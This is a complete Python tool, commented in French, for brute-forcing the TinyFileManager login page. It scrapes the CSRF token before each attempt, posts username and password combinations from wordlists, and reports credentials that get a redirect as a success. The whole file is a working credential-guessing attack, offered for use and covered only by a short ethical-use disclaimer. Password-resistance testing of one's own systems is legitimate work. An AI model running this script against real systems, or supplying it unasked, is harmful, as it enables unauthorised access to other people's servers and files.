#!/usr/bin/env python3
"""
TinyFileManager Brute Force Tool
--------------------------------
Ce script effectue des tests d'authentification sur TinyFileManager.
Il récupère dynamiquement les tokens CSRF et teste des combinaisons d'identifiants.

⚠️ Usage éthique uniquement :
- Ne tester que vos propres systèmes
- Obtenir une autorisation écrite avant tout test
- Respecter les lois locales sur la cybersécurité
"""

import requests
import re
import argparse
from time import sleep

def get_token(session, url):
    """Récupère le token CSRF de protection"""
    try:
        resp = session.get(url, timeout=5)
        resp.raise_for_status()
        match = re.search(r'name="token" value="([a-fA-F0-9]{64})"', resp.text)
        return match.group(1) if match else None
    except (requests.RequestException, re.error):
        return None

def attempt_login(session, url, username, password, token):
    """Tente une authentification"""
    payload = {
        "fm_usr": username,
        "fm_pwd": password,
        "token": token
    }
    try:
        resp = session.post(url, data=payload, allow_redirects=False, timeout=5)
        if resp.status_code == 302:
            return "success"  # Redirection = succès
        if "Invalid" not in resp.text and "alert" not in resp.text:
            return "possible"  # Réponse ambiguë
        return "failure"
    except requests.RequestException:
        return "error"

def main():
    parser = argparse.ArgumentParser(description="Test de résistance TinyFileManager")
    parser.add_argument("url", help="URL de la page de login (ex: http://site.com/fm.php)")
    parser.add_argument("-u", "--users", required=True, help="Fichier des noms d'utilisateur")
    parser.add_argument("-p", "--passwords", required=True, help="Fichier des mots de passe")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Délai entre les requêtes")
    args = parser.parse_args()

    # Chargement des wordlists
    with open(args.users) as f:
        usernames = [line.strip() for line in f if line.strip()]
    
    with open(args.passwords) as f:
        passwords = [line.strip() for line in f if line.strip()]

    # Configuration HTTP
    session = requests.Session()
    session.headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3"
    }

    # Brute force contrôlé
    for user in usernames:
        for pwd in passwords:
            token = get_token(session, args.url)
            if not token:
                print("[!] Échec récupération token, vérifier l'URL et la connexion")
                return

            result = attempt_login(session, args.url, user, pwd, token)
            
            if result == "success":
                print(f"[✅] Succès - {user}:{pwd}")
                return
            elif result == "possible":
                print(f"[⚠️] Résultat suspect - {user}:{pwd} → Vérification manuelle requise")
            
            sleep(args.delay)  # Respect des serveurs

    print("[❌] Aucun accès trouvé")

if __name__ == "__main__":
    main()